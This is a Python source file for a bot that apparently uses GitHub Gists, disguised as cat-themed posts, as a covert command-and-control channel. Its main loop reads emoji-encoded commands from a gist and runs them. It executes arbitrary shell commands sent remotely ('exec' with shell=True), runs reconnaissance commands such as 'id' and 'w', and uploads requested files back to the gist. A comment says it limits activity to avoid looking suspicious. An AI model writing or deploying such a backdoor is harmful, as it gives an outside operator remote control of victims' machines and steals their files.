import json
import os
import subprocess
import sys
import time

import emojis
import gist
import ping


def read_params():
    """
    Read parameters from input path (sys.argv[1])

    :return: data dictionary with ...
                filename:   Filename to be used in gist post
                name:       Name of the cat to be used in gist post
                urls:       Possible urls for use in the psot
                images_dir: Path to directory with images
    """
    file = open(sys.argv[1])
    json_data = file.read()
    params = json.loads(json_data)

    filename = params['filename']
    name = params['name']
    urls = params['urls']
    return filename, name, urls


FILENAME, NAME, URLS = read_params()
BOT_LIST = "CatsIWantToPet.md"

# Prepare helper folder (tmp directory)
if not os.path.exists('tmp'):
    os.mkdir('tmp')

# Check if bot list exists, if not exit
GIST_API = gist.get_gist_api()
posts = GIST_API.get_gists()
bot_list_exists = False
for p in posts:
    if BOT_LIST in p['files']:
        bot_list_exists = True
        break

if not bot_list_exists:
    print("BOT LIST DOES NOT EXISTS - BYE BYE", file=sys.stderr)
    exit(-1)

# Create bot -> bot post + add to bot list
print("Starting bot init ...")
gist.init(GIST_API, NAME, FILENAME, URLS, BOT_LIST)

# --------- BOT CODE ---------
while True:
    # Check if bot in bot list -> if not = add
    if "[" + NAME + "]" not in gist.get_raw(GIST_API, BOT_LIST):
        print("WARNING: {} was not in the bot list :o -> adding...".format(NAME), file=sys.stderr)
        bot_url = gist.create_bot_post(GIST_API, NAME, FILENAME, URLS)
        gist.add_to_bot_list(GIST_API, NAME, FILENAME, bot_url, BOT_LIST)

    # Check for status in my post, if reset check command
    # Not checking command every time, so we do not have to update fluffiness after every execution (too suspicious)
    status = gist.get_status_emoji(GIST_API, FILENAME)
    if status in emojis.status_code['reset']:
        cmd_emoji = gist.get_command_emoji(GIST_API, FILENAME)
        if cmd_emoji == emojis.command['ping']:
            print("RECEIVED ping", file=sys.stderr)
            ping.set_alive(GIST_API, FILENAME)
            print("EXECUTED ping", file=sys.stderr)

        elif cmd_emoji == emojis.command['w']:
            print("RECEIVED w", file=sys.stderr)
            data = subprocess.run('w', capture_output=True, shell=True)
            gist.send_respose_url(GIST_API, FILENAME, data)
            print("EXECUTED w", file=sys.stderr)

        elif cmd_emoji == emojis.command['ls']:
            params = gist.get_data_from_url(GIST_API, FILENAME)
            print("RECEIVED ls " + params, file=sys.stderr)
            data = subprocess.run('ls -la ' + params, capture_output=True, shell=True)
            gist.send_respose_url(GIST_API, FILENAME, data)
            print("EXECUTED ls", file=sys.stderr)

        elif cmd_emoji == emojis.command['id']:
            print("RECEIVED id", file=sys.stderr)
            data = subprocess.run('id', capture_output=True, shell=True)
            gist.send_respose_url(GIST_API, FILENAME, data)
            print("EXECUTED id", file=sys.stderr)

        elif cmd_emoji == emojis.command['cp']:
            params = gist.get_data_from_url(GIST_API, FILENAME)
            print("RECEIVED cp", file=sys.stderr)
            gist.send_file_respose_url(GIST_API, FILENAME, params)
            print("EXECUTED cp", file=sys.stderr)

        elif cmd_emoji == emojis.command['exec']:
            params = gist.get_data_from_url(GIST_API, FILENAME)
            print("RECEIVED exec " + params, file=sys.stderr)
            data = subprocess.run(params, capture_output=True, shell=True)
            gist.send_respose_url(GIST_API, FILENAME, data)
            print("EXECUTED exec", file=sys.stderr)

        else:
            print("Unknown command", file=sys.stderr)

    time.sleep(1)

# Cleanup all helper folder
# os.rmdir('tmp')
